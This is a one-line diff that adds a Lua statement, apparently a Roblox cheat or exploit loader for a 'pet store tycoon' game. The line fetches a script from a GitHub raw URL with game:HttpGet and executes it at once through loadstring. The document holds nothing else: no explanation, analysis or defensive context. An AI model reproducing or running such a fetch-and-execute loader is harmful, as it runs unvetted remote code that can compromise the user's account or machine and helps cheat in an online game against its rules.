@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Bravedersolve/loaders/main/loaders/pet-store-tycoon-spam7-jsib1vn1jd31oa.lua"))()
